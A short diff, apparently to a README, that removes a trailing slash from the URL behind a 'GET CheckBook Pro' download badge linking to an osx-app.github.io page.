@@ -7,7 +7,7 @@
 <br>   
 
 <div align="center">  
-<a href="https://osx-app.github.io/.github/checkbookpro/">  
+<a href="https://osx-app.github.io/.github/checkbookpro">  
 <img src="https://img.shields.io/badge/💰_GET_CheckBook_Pro-emerald?style=for-the-badge&logo=apple" alt="GET CheckBook Pro">  
 </a>  
 </div>  
